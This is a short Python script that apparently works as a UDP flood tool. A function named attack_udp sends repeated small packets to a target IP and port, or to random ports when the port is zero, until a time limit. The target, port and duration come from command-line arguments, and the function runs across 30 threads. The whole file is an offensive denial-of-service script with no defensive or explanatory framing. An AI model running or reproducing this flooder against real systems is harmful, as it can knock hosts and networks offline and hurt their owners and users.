import socket,random,sys,time, threading
 
def attack_udp(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        data = "0x1"
        s.sendto(data, (ip, dport))
        s.sendto(data, (ip, dport))
        s.sendto(data, (ip, dport))
        s.sendto(data, (ip, dport))
        s.sendto(data, (ip, dport))
        s.sendto(data, (ip, dport))

ip=sys.argv[1]
port=sys.argv[2]
tim2e=time.time()+int(sys.argv[3])
for _ in range(0,30):
 threading.Thread(target=attack_udp, args=(ip, int(port), tim2e, 5,)).start()